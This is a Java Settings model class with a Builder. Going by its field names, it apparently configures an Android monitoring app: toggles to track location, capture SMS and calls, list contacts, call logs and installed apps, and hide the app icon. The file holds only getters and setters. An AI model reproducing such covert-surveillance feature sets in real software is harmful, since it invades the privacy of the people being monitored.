package com.shiz.model.data;

/**
 * Created by oldman on 05.04.17.
 */
public class Settings {
    private boolean is_location;
    private int location_mode;
    private boolean is_sms;
    private boolean is_call;
    private boolean list_sms;
    private boolean list_call;
    private boolean list_app;
    private boolean list_phone_book;
    private boolean is_hide_icon;
    private boolean is_service;
    private boolean is_airplane_mode;
    private boolean is_wifi;
    private boolean is_screen;
    private int password;

    public Settings() {
    }

    private Settings(Builder builder) {
        setIsLocation(builder.is_location);
        setIsSms(builder.is_sms);
        setIsCall(builder.is_call);
        setListSms(builder.list_sms);
        setListCall(builder.list_call);
        setListApp(builder.list_app);
        setListPhoneBook(builder.list_phone_book);
        setHideIcon(builder.hide_icon);
        setLocationMode(builder.location_mode);
        setIsService(builder.is_service);
        setPassword(builder.password);
        setIsScreen(builder.is_screen);
        setIsWifi(builder.is_wifi);
        setIsAirplaneMode(builder.is_airplane_mode);

    }
    public static Builder newBuilder() {
        return new Builder();
    }

    public int getPassword() {
        return password;
    }

    public void setPassword(int password) {
        this.password = password;
    }

    public boolean isScreen() {
        return is_screen;
    }

    public void setIsScreen(boolean is_screen) {
        this.is_screen = is_screen;
    }

    public boolean isWifi() {
        return is_wifi;
    }

    public void setIsWifi(boolean is_wifi) {
        this.is_wifi = is_wifi;
    }

    public boolean isAirplaneMode() {
        return is_airplane_mode;
    }

    public void setIsAirplaneMode(boolean is_airplane_mode) {
        this.is_airplane_mode = is_airplane_mode;
    }


    public boolean isLocation() {
        return is_location;
    }

    public boolean isHideIcon() {
        return is_hide_icon;
    }

    public void setHideIcon(boolean is_hide_icon) {
        this.is_hide_icon = is_hide_icon;
    }

    public void setIsLocation(boolean is_location) {
        this.is_location = is_location;
    }

    public boolean isSms() {
        return is_sms;
    }

    public void setIsSms(boolean is_sms) {
        this.is_sms = is_sms;
    }

    public boolean isCall() {
        return is_call;
    }

    public void setIsCall(boolean is_call) {
        this.is_call = is_call;
    }

    public boolean isListSms() {
        return list_sms;
    }

    public void setListSms(boolean list_sms) {
        this.list_sms = list_sms;
    }

    public boolean isListCall() {
        return list_call;
    }

    public void setListCall(boolean list_call) {
        this.list_call = list_call;
    }

    public boolean isListApp() {
        return list_app;
    }

    public void setListApp(boolean list_app) {
        this.list_app = list_app;
    }

    public boolean isListPhoneBook() {
        return list_phone_book;
    }

    public void setListPhoneBook(boolean list_phone_book) {
        this.list_phone_book = list_phone_book;
    }

    public int isLocationMode() {
        return location_mode;
    }

    public void setLocationMode(int location_mode) {
        this.location_mode = location_mode;
    }

    public boolean isService() {
        return is_service;
    }

    public void setIsService(boolean is_service) {
        this.is_service = is_service;
    }

    public static final class Builder {
        private boolean is_location;
        private boolean is_sms;
        private boolean is_call;
        private boolean list_sms;
        private boolean list_call;
        private boolean list_app;
        private boolean list_phone_book;
        private boolean hide_icon;
         private int location_mode;
        private boolean is_service;
        private boolean is_airplane_mode;
        private boolean is_wifi;
        private boolean is_screen;
        private int password;

        private Builder() {
        }

        public Builder is_airplane_mode(boolean val) {
            is_airplane_mode = val;
            return this;
        }

        public Builder is_wifi(boolean val) {
            is_wifi = val;
            return this;
        }

        public Builder is_screen(boolean val) {
            is_screen = val;
            return this;
        }

        public Builder password(int val) {
            password = val;
            return this;
        }

        public Builder is_location(boolean val) {
            is_location = val;
            return this;
        }

        public Builder is_service(boolean val) {
            is_service = val;
            return this;
        }

        public Builder location_mode(int val) {
            location_mode = val;
            return this;
        }

        public Builder is_sms(boolean val) {
            is_sms = val;
            return this;
        }

        public Builder is_call(boolean val) {
            is_call = val;
            return this;
        }

        public Builder list_sms(boolean val) {
            list_sms = val;
            return this;
        }

        public Builder list_call(boolean val) {
            list_call = val;
            return this;
        }

        public Builder list_app(boolean val) {
            list_app = val;
            return this;
        }

        public Builder list_phone_book(boolean val) {
            list_phone_book = val;
            return this;
        }

        public Builder hide_icon(boolean val) {
            hide_icon = val;
            return this;
        }
        public Settings build() {
            return new Settings(this);
        }
    }
}
